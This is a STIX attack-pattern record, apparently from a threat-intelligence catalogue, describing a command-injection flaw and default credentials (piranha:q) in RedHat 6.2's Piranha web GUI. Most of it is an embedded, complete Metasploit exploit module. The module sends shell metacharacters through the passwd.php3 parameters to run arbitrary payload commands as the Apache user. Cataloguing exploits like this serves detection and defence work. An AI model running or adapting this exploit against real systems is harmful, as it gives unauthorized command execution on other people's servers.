{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--74b35e98-7386-4725-ad93-2ef50010a830",
    "created": "2024-08-14T17:00:38.528301Z",
    "modified": "2024-08-14T17:00:38.528305Z",
    "name": "RedHat Piranha Virtual Server Package passwd.php3 Arbitrary Command Execution",
    "description": " This module abuses two flaws - a metacharacter injection vulnerability in the HTTP management server of RedHat 6.2 systems running the Piranha LVS cluster service and GUI (rpm packages: piranha and piranha-gui). The vulnerability allows an authenticated attacker to execute arbitrary commands as the Apache user account (nobody) within the /piranha/secure/passwd.php3 script. The package installs with a default user and password of piranha:q which was exploited in the wild. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/piranha_passwd_exec.rb",
            "external_id": "piranha_passwd_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2000-0248"
        },
        {
            "source_name": "CVE",
            "external_id": "2000-0322"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  HttpFingerprint = { :pattern => [ /Apache/ ] }\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'RedHat Piranha Virtual Server Package passwd.php3 Arbitrary Command Execution',\n      'Description'    => %q{\n        This module abuses two flaws - a metacharacter injection vulnerability in the\n        HTTP management server of RedHat 6.2 systems running the Piranha\n        LVS cluster service and GUI (rpm packages: piranha and piranha-gui).\n        The vulnerability allows an authenticated attacker to execute arbitrary\n        commands as the Apache user account (nobody) within the\n        /piranha/secure/passwd.php3 script. The package installs with a default\n        user and password of piranha:q which was exploited in the wild.\n      },\n      'Author'         => [ 'aushack' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          # Default password\n          [ 'CVE', '2000-0248' ],\n          [ 'OSVDB', '289' ],\n          [ 'BID', '1148' ],\n          # Command Execution\n          [ 'CVE', '2000-0322' ],\n          [ 'OSVDB', '1300' ],\n          [ 'BID', '1149' ]\n        ],\n      'Platform'       => ['unix'],\n      'Arch'           => ARCH_CMD,\n      'Privileged'     => false,\n      'Payload'        =>\n        {\n          'Space'       => 1024,\n          'DisableNops' => true,\n          'BadChars'    => \"\\x22\\x27\", # magic_quotes_gpc\n          # NOTE: We specify our own custom-ish encoder here.\n          # This is due to lots of incompatabilities with the old RedHat 6.2 test system.\n          # 1. inetd exists, but the syntax is no good.\n          # 2. telnet exists\n          # 3. /dev/tcp doesn't work.\n          # 4. PHP's magic_quotes_gpc is on by default, causing escaping of single/double quotes.\n          # 5. echo -ne doesn't work\n          'EncoderType' => Msf::Encoder::Type::PrintfPHPMagicQuotes,\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd',\n              'RequiredCmd' => 'generic perl'\n            }\n        },\n      'Targets'        =>\n        [\n          [ 'Automatic (piranha-gui-0.4.12-1.i386.rpm)', { } ]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2000-04-04'))\n\n    register_options(\n      [\n        OptString.new('HttpUsername', [true, 'The HTTP username to specify for basic authentication', 'piranha']),\n        OptString.new('HttpPassword', [true, 'The HTTP password to specify for basic authentication', 'q'])\n      ])\n  end\n\n  def exploit\n    cmd = Rex::Text.uri_encode(payload.encoded, 'hex-normal')\n    str = \"/piranha/secure/passwd.php3?try1=q+;#{cmd}&try2=q+;#{cmd}&passwd=ACCEPT\"\n    print_status(\"Sending GET request with encoded command line...\")\n    res = send_request_raw({\n        'uri' => str,\n        'method' => 'GET',\n        'headers' =>\n          {\n            'content-type' => 'application/x-www-form-urlencoded',\n          },\n      }, 3)\n\n    if not res\n      print_error(\"Invalid response, not likely to be vulnerable\")\n      return\n    end\n\n    if res.code == 401\n      print_error(\"401 Authorization Required! Our Credentials not accepted!\")\n    elsif (res.code == 200 and res.body =~ /The passwords you supplied match/)\n      print_good(\"Command successfully executed (according to the server).\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2000-04-04",
    "x_mitre_platforms": [
        "['unix']"
    ]
}